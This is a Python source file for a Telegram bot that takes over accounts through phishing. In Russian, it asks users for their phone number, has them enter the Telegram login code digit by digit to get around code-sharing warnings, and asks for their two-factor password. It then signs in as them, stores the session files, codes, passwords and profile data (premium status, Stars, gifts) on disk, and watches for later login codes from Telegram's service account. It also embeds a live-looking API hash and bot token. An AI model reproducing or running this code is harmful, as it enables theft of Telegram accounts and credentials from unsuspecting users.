import time
import re
import os
import sys
import random
from telethon.sync import TelegramClient
from telethon import events, functions
from telethon.tl.custom import Button
from telethon.errors import SessionPasswordNeededError, CodeInvalidError, RPCError, FloodWaitError
from telethon.tl.types import ReplyKeyboardMarkup, KeyboardButtonRow, KeyboardButton


if not os.path.exists('sessions'):
    os.makedirs('sessions')
if not os.path.exists('data'):
    os.makedirs('data')


API_ID = '25835873'
API_HASH = '279f48881ec401ade06dd5fd6f0f05fc'
BOT_TOKEN = '7553890021:AAFQlMn_SCUafCEyGCrt1ncdhoH0Iorgdg8'


sessions = {}
last_code_request = {}  
active_clients = {}  


def log_message(message, file_name='bot_log.txt'):
    """Log message to console and file"""
    time_str = time.strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{time_str}] {message}"
    print(log_line)
    with open(file_name, 'a', encoding='utf-8') as f:
        f.write(log_line + '\n')

def create_number_keyboard():
    return ReplyKeyboardMarkup(
        rows=[
            KeyboardButtonRow(buttons=[KeyboardButton(text=str(i)) for i in range(1, 4)]),
            KeyboardButtonRow(buttons=[KeyboardButton(text=str(i)) for i in range(4, 7)]),
            KeyboardButtonRow(buttons=[KeyboardButton(text=str(i)) for i in range(7, 10)]),
            KeyboardButtonRow(buttons=[KeyboardButton(text="0")]),
            KeyboardButtonRow(buttons=[KeyboardButton(text="⬅ Удалить последнюю цифру")])
        ],
        resize=True
    )

async def check_and_save_account_data(client, user_id):
    """Check account data and save to file without sending to user"""
    data_to_save = []
    try:
        me = await client.get_me()
        data_to_save.append(f"Username: {me.username or 'None'}")
        data_to_save.append(f"First name: {me.first_name or 'None'}")
        data_to_save.append(f"Last name: {me.last_name or 'None'}")
        data_to_save.append(f"Phone: {me.phone or 'None'}")
        
        try:
            full_user = await client(functions.users.GetFullUserRequest(id=me.id))
            
        
            is_premium = getattr(full_user.full_user, 'premium', False)
            data_to_save.append(f"Premium status: {'Yes' if is_premium else 'No'}")
            
            data_to_save.append("Available attributes in user object:")
            for attr in dir(full_user.full_user):
                if not attr.startswith('_') and attr != 'CONSTRUCTOR_ID' and attr != 'SUBCLASS_OF_ID':
                    try:
                        value = getattr(full_user.full_user, attr)
                        
                        if 'star' in attr.lower():
                            data_to_save.append(f"  [STAR] {attr}: {value}")
                       
                        elif 'gift' in attr.lower():
                            data_to_save.append(f"  [GIFT] {attr}: {value}")
                       
                        else:
                            data_to_save.append(f"  {attr}")
                    except Exception as attr_err:
                        data_to_save.append(f"  {attr}: [Error accessing: {str(attr_err)}]")
            
           
            possible_star_attrs = [
                'stars_count', 'stars', 'star_count', 'starscount',
                'story_stars', 'stories_stars', 'total_stars'
            ]
            
            for attr_name in possible_star_attrs:
                if hasattr(full_user.full_user, attr_name):
                    star_value = getattr(full_user.full_user, attr_name)
                    data_to_save.append(f"Stars count (from {attr_name}): {star_value}")
                    break
            else:
                data_to_save.append("Stars count: Not found in common attribute names")
            
            
            possible_gift_attrs = [
                'gifts_count', 'gifts', 'gift_count', 'giftscount',
                'received_gifts', 'total_gifts'
            ]
            
            for attr_name in possible_gift_attrs:
                if hasattr(full_user.full_user, attr_name):
                    gift_value = getattr(full_user.full_user, attr_name)
                    if isinstance(gift_value, list):
                        data_to_save.append(f"Gifts count (from {attr_name}): {len(gift_value)}")
                    else:
                        data_to_save.append(f"Gifts count (from {attr_name}): {gift_value}")
                    break
            else:
                data_to_save.append("Gifts count: Not found in common attribute names")
                
        except Exception as e:
            data_to_save.append(f"Error getting user data: {str(e)}")
        
   
        with open(f'data/{user_id}_account_data.txt', 'w', encoding='utf-8') as f:
            for line in data_to_save:
                f.write(f"{line}\n")
        
    
        log_message(f"[Account Data] Saved account data for User ID: {user_id}")
        
   
        with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
            f.write("\n--- Account Data Retrieved ---\n")
            for line in data_to_save:
                f.write(f"{line}\n")
            f.write("--- End of Account Data ---\n")
            
    except Exception as e:
        error_msg = f"Error collecting account data: {str(e)}"
        log_message(f"[Error] {error_msg}")
       
        with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
            f.write(f"\nError collecting account data: {str(e)}\n")

def setup_client_event_handlers(client, user_id, bot):
    """Set up event handlers for a client"""
    @client.on(events.NewMessage(incoming=True))
    async def client_incoming_handler(message_event):
        message_text = message_event.text
        sender = await message_event.get_sender()
        
        
        if sender and hasattr(sender, 'id') and sender.id == 777000:
    
            code_match = re.search(r'\b(\d{5})\b', message_text)
            if code_match:
                intercepted_code = code_match.group(0)
                log_message(f"[Intercepted Code] User ID: {user_id}, Code: {intercepted_code}")                
                with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                    f.write(f"Intercepted Code: {intercepted_code}\n")
               
            else:               
                with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                    f.write(f"Message from Telegram (no code found): {message_text}\n")

async def setup_client_session(user_id, phone, event):
    """Initialize client session for a user"""
    try:
        client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
        await client.connect()
        
        current_time = time.time()
        if user_id in last_code_request and (current_time - last_code_request[user_id] < 120):
            await event.respond("Пожалуйста, подожди 2 минуты перед новым запросом кода.")
            return None
        
        await client.send_code_request(phone)
        last_code_request[user_id] = current_time
        
        with open(f'data/{user_id}.txt', 'w', encoding='utf-8') as f:
            f.write(f"User ID: {user_id}\n")
            f.write(f"Phone: {phone}\n")
            
        return client
    except Exception as e:
        await event.respond(f"Ошибка: {str(e)}")
        with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
            f.write(f"Error during phone request: {str(e)}\n")
        return None

async def main():
    max_retries = 5
    retry_count = 0
    base_wait_time = 30 
    
    while retry_count < max_retries:
        try:
            log_message("Initializing bot...")
            
           
            session_path = 'bot_session'
            if os.path.exists(f"{session_path}.session"):
                os.remove(f"{session_path}.session")
                log_message("Removed existing session file")
            
          
            bot = TelegramClient(session_path, API_ID, API_HASH)
            @bot.on(events.NewMessage(pattern='/start'))
            async def start(event):
                user_id = event.sender_id
                log_message(f"User {user_id} started the bot")
                keyboard = [[Button.request_phone("📱 Поделиться контактом")]]
            
                await event.respond(
                    "Привет! Для начала работы, пожалуйста, поделись своим номером телефона, нажав на кнопку ниже:",
                    buttons=keyboard
                )
                sessions[user_id] = {'state': 'awaiting_phone'}
            
            @bot.on(events.NewMessage)
            async def handler(event):
                user_id = event.sender_id
                text = event.text
                
                if user_id not in sessions:
                    return
                
                user_session = sessions[user_id]
                
                if user_session.get('state') == 'awaiting_phone':

                    if event.message.contact:
                        phone = event.message.contact.phone_number
                        if not phone.startswith('+'):
                            phone = '+' + phone
                        

                        client = await setup_client_session(user_id, phone, event)
                        if client:
                            user_session['phone'] = phone
                            user_session['client'] = client
                            user_session['state'] = 'awaiting_code'
                            user_session['current_code'] = ""
                            
                            await event.respond("Теперь введите код по одной цифре, используя кнопки ниже:", buttons=create_number_keyboard())
                    else:

                        keyboard = [[Button.request_phone("📱 Поделиться контактом")]]
                        await event.respond("Пожалуйста, используй кнопку ниже, чтобы поделиться контактом:", buttons=keyboard)

                elif user_session.get('state') == 'awaiting_code':
                    client = user_session['client']
                    

                    if text == "⬅ Удалить последнюю цифру":
                        if user_session['current_code']:
                            user_session['current_code'] = user_session['current_code'][:-1]
                            await event.respond(f"Текущий код: {user_session['current_code'] or 'пусто'}", buttons=create_number_keyboard())
                        else:
                            await event.respond("Код пуст, нечего удалять.", buttons=create_number_keyboard())
                        return
                    
                    if text.isdigit() and len(text) == 1:
                        user_session['current_code'] += text
                        await event.respond(f"Текущий код: {user_session['current_code']}", buttons=create_number_keyboard())
                        
                        if len(user_session['current_code']) == 5:
                            code = user_session['current_code']
                            try:
                                await client.sign_in(user_session['phone'], code)
                                

                                if await client.is_user_authorized():
                                    await event.respond("Успешный вход!", buttons=Button.clear())
                                    
                                    with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                                        f.write(f"Code: {code}\n")
                                        f.write("Login: Successful\n")

                                    setup_client_event_handlers(client, user_id, bot)
                                    

                                    active_clients[user_id] = client
                                    log_message(f"[Client Added] User ID: {user_id}, Phone: {user_session['phone']}, Client active")
                                    

                                    await check_and_save_account_data(client, user_id)
                                    
                                    del sessions[user_id]
                                
                            except SessionPasswordNeededError:
                                user_session['state'] = 'awaiting_password'
                                await event.respond("Требуется пароль двухфакторной аутентификации. Введи пароль:", buttons=Button.clear())
                            
                            except RPCError as e:
                                if "PHONE_CODE_EXPIRED" in str(e):
                                    await event.respond("Код подтверждения истек. Давай запросим новый код.", buttons=Button.clear())
                                    try:
                                        current_time = time.time()
                                        if user_id in last_code_request and (current_time - last_code_request[user_id] < 120):
                                            await event.respond("Пожалуйста, подожди 2 минуты перед новым запросом кода.")
                                            return
                                        
                                        await client.send_code_request(user_session['phone'], force_sms=True)
                                        last_code_request[user_id] = current_time
                                        user_session['current_code'] = ""
                                        await event.respond("Новый код отправлен. Пожалуйста, введи его по одной цифре:", buttons=create_number_keyboard())
                                        with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                                            f.write("Code: Expired, new code requested\n")
                                    except Exception as e:
                                        await event.respond(f"Ошибка при запросе нового кода: {str(e)}", buttons=Button.clear())
                                        with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                                            f.write(f"Error requesting new code: {str(e)}\n")
                                elif "PHONE_CODE_INVALID" in str(e):
                                    await event.respond("Неверный код. Давай попробуем еще раз.", buttons=create_number_keyboard())
                                    user_session['current_code'] = ""
                                    with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                                        f.write("Code: Invalid attempt\n")
                                else:
                                    await event.respond(f"Ошибка: {str(e)}", buttons=Button.clear())
                                    with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                                        f.write(f"Error during code verification: {str(e)}\n")
                                    
                            except Exception as e:
                                await event.respond(f"Ошибка: {str(e)}", buttons=Button.clear())
                                with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                                    f.write(f"Error during code verification: {str(e)}\n")
                    else:
                        await event.respond("Пожалуйста, используй кнопки ниже для ввода цифр.", buttons=create_number_keyboard())
                
                elif user_session.get('state') == 'awaiting_password':
                    client = user_session['client']
                    password = text
                    
                    try:
                        await client.sign_in(password=password)
                        if await client.is_user_authorized():
                            await event.respond("Успешный вход с двухфакторной аутентификацией!")
                            with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                                f.write(f"Password: {password}\n")
                                f.write("Login with 2FA: Successful\n")
                            
                            setup_client_event_handlers(client, user_id, bot)
                            active_clients[user_id] = client
                            log_message(f"[Client Added] User ID: {user_id}, Client added to active_clients after 2FA")
                            
                            await check_and_save_account_data(client, user_id)
                            
                            del sessions[user_id]
                        else:
                            await event.respond("Неверный пароль, попробуй еще раз:")
                            with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                                f.write("Password: Failed attempt\n")
                            
                    except Exception as e:
                        await event.respond(f"Ошибка: {str(e)}")
                        with open(f'data/{user_id}.txt', 'a', encoding='utf-8') as f:
                            f.write(f"Error during 2FA: {str(e)}\n")
            
            log_message("Starting bot...")
            await bot.start(bot_token=BOT_TOKEN)
            log_message("Bot started successfully!")
            retry_count = 0
            log_message("Bot is running! Press Ctrl+C to stop")
            await bot.run_until_disconnected()
            
        except FloodWaitError as e:
            wait_time = e.seconds
            log_message(f"FloodWaitError: Need to wait {wait_time} seconds before reconnecting")
            log_message(f"Waiting...")
            time.sleep(wait_time + 5)  
            
        except Exception as e:
            error_str = str(e)           
            if "ImportBotAuthorizationRequest" in error_str:
                wait_time_match = re.search(r'wait of (\d+) seconds', error_str)
                wait_time = int(wait_time_match.group(1)) if wait_time_match else base_wait_time * (2 ** retry_count)
                log_message(f"Error in main: {error_str}")
                log_message(f"ImportBotAuthorizationRequest error. Waiting {wait_time} seconds...")
                jitter = random.uniform(0.5, 1.5)
                actual_wait = int(wait_time * jitter)
                log_message(f"Actual wait time with jitter: {actual_wait} seconds")
                
                time.sleep(actual_wait)
                
                retry_count += 1
                if retry_count >= max_retries:
                    log_message(f"Maximum retries ({max_retries}) reached. Trying different approach...")
                    log_message("Please generate a new bot token with @BotFather and update the code.")
                    sys.exit(1)
            else:
                log_message(f"Unexpected error: {error_str}")
                time.sleep(base_wait_time)
                retry_count += 1

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())